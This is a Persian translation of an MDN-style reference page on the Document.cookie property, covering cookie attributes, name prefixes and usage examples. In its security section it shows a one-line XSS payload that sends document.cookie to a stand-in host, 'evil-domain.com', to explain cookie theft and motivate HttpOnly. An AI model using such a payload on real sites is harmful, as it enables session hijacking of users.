---
title: "Document: cookie property"
---

---
title: "Document: cookie property"
short-title: cookie
slug: Web/API/Document/cookie
page-type: web-api-instance-property
browser-compat: api.Document.cookie
---

{{APIRef("DOM")}}

ویژگی `cookie` در {{domxref("Document")}} به شما امکان می‌دهد [کوکی‌ها](/en-US/docs/Web/HTTP/Guides/Cookies) مرتبط با سند را بخوانید و بنویسید. این ویژگی به‌عنوان getter و setter برای مقادیر واقعی کوکی‌ها عمل می‌کند.

> [!NOTE]
> `document.cookie` می‌تواند منبع مشکلات کارایی باشد، زیرا یک API همزمان است و هنگام خواندن کوکی‌ها بین فرآیندها یا انجام عملیات I/O، رشته اصلی (main thread) را مسدود می‌کند. توسعه‌دهندگان باید در صورت امکان از [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) ناهمگام برای مدیریت کوکی‌ها استفاده کنند.

## مقدار

رشته‌ای شامل فهرستی از همه کوکی‌ها که با نقطه‌ویرگول جدا شده‌اند (یعنی جفت‌های `key=value`).
توجه داشته باشید که هر _کلید_ و _مقدار_ ممکن است با فضای خالی (شامل فاصله و تب) احاطه شود: در واقع، {{RFC(6265)}} یک فاصله پس از هر نقطه‌ویرگول را الزام می‌کند، اما برخی عامل‌های کاربر ممکن است از این قاعده پیروی نکنند.

همچنین می‌توانید به این ویژگی رشته‌ای به شکل `"key=value"` نسبت دهید و کوکی موردنظر برای تنظیم/به‌روزرسانی را مشخص کنید. توجه داشته باشید که با این روش فقط می‌توانید در هر بار یک کوکی را تنظیم/به‌روزرسانی کنید. همچنین در نظر بگیرید که:

- `;domain=domain` (مثلاً `example.com` یا `subdomain.example.com`): میزبانی که کوکی به آن ارسال خواهد شد.
  اگر مشخص نشود، به‌طور پیش‌فرض به بخش host از مکان سند فعلی تنظیم می‌شود و کوکی در زیردامنه‌ها در دسترس نخواهد بود.
  اگر یک دامنه مشخص شود، زیردامنه‌ها همیشه شامل می‌شوند.
  برخلاف مشخصات قبلی، نقطه‌های ابتدایی در نام دامنه نادیده گرفته می‌شوند، اما ممکن است مرورگرها از تنظیم کوکی حاوی چنین نقطه‌هایی خودداری کنند.

  > [!NOTE]
  > دامنه _باید_ با دامنه مبدأ جاوااسکریپت مطابقت داشته باشد.
  > تنظیم کوکی‌ها برای دامنه‌های خارجی بی‌صدا نادیده گرفته می‌شود.

- `;expires=date-in-UTCString-format`: تاریخ انقضای کوکی. اگر نه `expires` و نه `max-age` مشخص شده باشد، کوکی در پایان نشست منقضی می‌شود.

  > [!WARNING]
  > وقتی حریم خصوصی کاربر مطرح است، مهم است که هر پیاده‌سازی برنامه وب پس از یک مهلت زمانی مشخص، داده‌های کوکی را بی‌اعتبار کند، به‌جای اینکه به مرورگر برای انجام این کار تکیه کند.
  > بسیاری از مرورگرها به کاربران اجازه می‌دهند تعیین کنند کوکی‌ها هرگز منقضی نشوند، که لزوماً امن نیست.

  برای کمک در قالب‌بندی این مقدار، {{jsxref("Date.toUTCString()")}} را ببینید.

- `;max-age=max-age-in-seconds`: حداکثر عمر کوکی بر حسب ثانیه (مثلاً `60*60*24*365` یا 31536000 برای یک سال).

- `;partitioned`: نشان می‌دهد که کوکی باید با استفاده از ذخیره‌سازی پارتیشن‌بندی‌شده ذخیره شود. برای جزئیات بیشتر به [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Guides/Third-party_cookies/Partitioned_cookies) مراجعه کنید.

- `;path=path`: مقدار ویژگی `Path` کوکی (برای اطلاعات بیشتر به [Define where cookies are sent](/en-US/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) مراجعه کنید).

- `;samesite`: ویژگی `SameSite` در هدر {{httpheader("Set-Cookie")}} می‌تواند توسط سرور تنظیم شود تا مشخص کند کوکی چه زمانی ارسال خواهد شد. مقادیر ممکن عبارت‌اند از `lax`، `strict` یا `none` (همچنین ببینید [Controlling third-party cookies with `SameSite`](/en-US/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
  - مقدار `lax` کوکی را برای همه درخواست‌های همان‌سایت و درخواست‌های GET ناوبری سطح بالا ارسال می‌کند.
    این مقدار برای ردیابی کاربر کافی است، اما از بسیاری از حملات [Cross-Site Request Forgery](/en-US/docs/Glossary/CSRF) (CSRF) جلوگیری می‌کند.
    این مقدار پیش‌فرض در مرورگرهای مدرن است.
  - مقدار `strict` از ارسال کوکی توسط مرورگر به سایت مقصد در همه زمینه‌های مرور بین‌سایتی جلوگیری می‌کند، حتی هنگام دنبال کردن یک پیوند معمولی.
  - مقدار `none` به صراحت بیان می‌کند که هیچ محدودیتی اعمال نخواهد شد.
    کوکی در همه درخواست‌ها — چه بین‌سایتی و چه همان‌سایتی — ارسال خواهد شد.

- `;secure`: مشخص می‌کند که کوکی فقط از طریق یک پروتکل امن منتقل شود.

رشته مقدار کوکی می‌تواند از {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} استفاده کند تا اطمینان حاصل شود که رشته شامل هیچ کاما، نقطه‌ویرگول یا فضای خالی نباشد (که در مقادیر کوکی مجاز نیستند).

نام کوکی می‌تواند پیشوندی داشته باشد که محدودیت‌های خاصی را بر ویژگی‌های کوکی در عامل‌های کاربر پشتیبان اعمال می‌کند. همه پیشوندهای کوکی با دو زیرخط (`__`) شروع می‌شوند و با خط تیره (`-`) پایان می‌یابند. پیشوندهای زیر تعریف شده‌اند:

- **`__Secure-`**: کوکی‌هایی که نام آن‌ها با `__Secure-` شروع می‌شود باید با ویژگی `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند.
- **`__Host-`**: کوکی‌هایی که نام آن‌ها با `__Host-` شروع می‌شود باید با ویژگی `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند. علاوه بر این، نباید ویژگی `Domain` برای آن‌ها مشخص شده باشد و ویژگی `Path` باید روی `/` تنظیم شود. این تضمین می‌کند که چنین کوکی‌هایی فقط به میزبانی که آن‌ها را تنظیم کرده ارسال می‌شوند، نه به هیچ میزبان دیگری در دامنه. همچنین تضمین می‌کند که آن‌ها در سطح میزبان تنظیم شده‌اند و نمی‌توان آن‌ها را در هیچ مسیری روی آن میزبان بازنویسی کرد. این ترکیب کوکی‌ای به وجود می‌آورد که تا جای ممکن به در نظر گرفتن مبدأ به‌عنوان مرز امنیتی نزدیک است.
- **`__Http-`**: کوکی‌هایی که نام آن‌ها با `__Http-` شروع می‌شود باید با پرچم `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند و علاوه بر آن باید ویژگی `HttpOnly` را داشته باشند تا ثابت شود که از طریق هدر `Set-Cookie` تنظیم شده‌اند (نمی‌توان آن‌ها را از طریق ویژگی‌های جاوااسکریپت مانند `Document.cookie` یا [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) تنظیم یا تغییر داد).
- **`__Host-Http-`**: کوکی‌هایی که نام آن‌ها با `__Host-Http-` شروع می‌شود باید با پرچم `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند و باید ویژگی `HttpOnly` را داشته باشند تا ثابت شود که از طریق هدر `Set-Cookie` تنظیم شده‌اند. علاوه بر این، آن‌ها همان محدودیت‌های کوکی‌های با پیشوند `__Host-` را نیز دارند. این ترکیب کوکی‌ای به وجود می‌آورد که تا جای ممکن به در نظر گرفتن مبدأ به‌عنوان مرز امنیتی نزدیک است و در عین حال اطمینان می‌دهد توسعه‌دهندگان و اپراتورهای سرور می‌دانند که دامنه (scope) آن به درخواست‌های HTTP محدود است.

> [!NOTE]
> خط تیره بخشی از پیشوند محسوب می‌شود.

> [!NOTE]
> این پرچم‌ها فقط با ویژگی `secure` قابل تنظیم هستند.

> [!NOTE]
> ویژگی `document.cookie` یک [accessor property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) با توابع بومی _setter_ و _getter_ است و در نتیجه یک [data property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) با مقدار نیست: آنچه می‌نویسید همان چیزی نیست که می‌خوانید، همه‌چیز همیشه توسط مفسر جاوااسکریپت واسطه‌گری می‌شود.

## مثال‌ها

### مثال ۱: استفاده ساده

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### مثال ۲: دریافت یک کوکی نمونه به نام test2

```html
<button id="show">Show cookie value</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### مثال ۳: انجام کاری فقط یک بار

برای استفاده از کد زیر، لطفاً همه موارد کلمه `doSomethingOnlyOnce` (نام کوکی) را با یک نام دلخواه جایگزین کنید.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### مثال ۴: بازنشانی کوکی قبلی

```html
<button id="reset">Reset only once cookie</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### مثال ۵: بررسی وجود یک کوکی

```html
<button id="check">Check a cookie exists</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> The cookie "reader" exists';
  } else {
    output.textContent = '> The cookie "reader" does not exist';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### مثال ۶: بررسی اینکه یک کوکی مقدار مشخصی دارد

```html
<button id="check">Check that a cookie has a specific value</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## امنیت

توجه به این نکته مهم است که ویژگی `path` در برابر خواندن غیرمجاز کوکی از یک مسیر دیگر محافظت نمی‌کند. می‌توان به‌راحتی با استفاده از DOM آن را دور زد، مثلاً با ایجاد یک عنصر پنهان {{HTMLElement("iframe")}} با مسیر کوکی و سپس دسترسی به ویژگی `contentDocument.cookie` آن iframe. تنها راه محافظت از کوکی، استفاده از یک دامنه یا زیردامنه متفاوت است، به دلیل [same origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).

کوکی‌ها اغلب در برنامه‌های وب برای شناسایی کاربر و نشست احراز هویت‌شده او استفاده می‌شوند. سرقت یک کوکی از یک برنامه وب منجر به ربودن نشست کاربر احراز هویت‌شده می‌شود. روش‌های رایج سرقت کوکی‌ها شامل استفاده از [مهندسی اجتماعی](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) یا بهره‌برداری از یک آسیب‌پذیری [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) در برنامه است -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

ویژگی کوکی `HTTPOnly` می‌تواند به کاهش این حمله کمک کند، زیرا دسترسی به مقدار کوکی را از طریق جاوااسکریپت مسدود می‌کند. بیشتر درباره [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/) بخوانید.

## نکات

- از Firefox 2 به بعد، سازوکار بهتری برای ذخیره‌سازی سمت کلاینت در دسترس است - [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API).
- می‌توانید یک کوکی را با به‌روزرسانی زمان انقضای آن به صفر حذف کنید.
- به خاطر داشته باشید که هر چه کوکی‌های بیشتری داشته باشید، داده‌های بیشتری برای هر درخواست بین سرور و کلاینت منتقل می‌شود. این کار هر درخواست را کندتر می‌کند. اگر می‌خواهید داده‌های «فقط سمت کلاینت» (client-only) را نگهداری کنید، به شدت توصیه می‌شود از [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API) استفاده کنید.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (بخش 5.3، «محدودیت‌های پیاده‌سازی») مشخص می‌کند که **هیچ حداکثر طولی** برای اندازه کلید یا مقدار کوکی نباید وجود داشته باشد و پیاده‌سازی‌ها را تشویق می‌کند از **کوکی‌های دلخواه بزرگ** پشتیبانی کنند. حداکثر پیاده‌سازی هر مرورگر لزوماً متفاوت خواهد بود، بنابراین به مستندات مرورگر مربوطه مراجعه کنید.

دلیل عدم تقارن بین خواندن و نوشتن ویژگی دسترسی `document.cookie` به ماهیت کلاینت-سرور کوکی‌ها برمی‌گردد که با سایر روش‌های ذخیره‌سازی کلاینت-کلاینت (مثلاً [localStorage](/en-US/docs/Web/API/Web_Storage_API)) متفاوت است:

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

- کلاینت کوکی‌های ذخیره‌شده قبلی خود را به سرور برمی‌گرداند:

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## مشخصات

{{Specifications}}

## سازگاری مرورگر

{{Compat}}

## جستارهای وابسته

- [HTTP cookies](/en-US/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/en-US/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/en-US/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)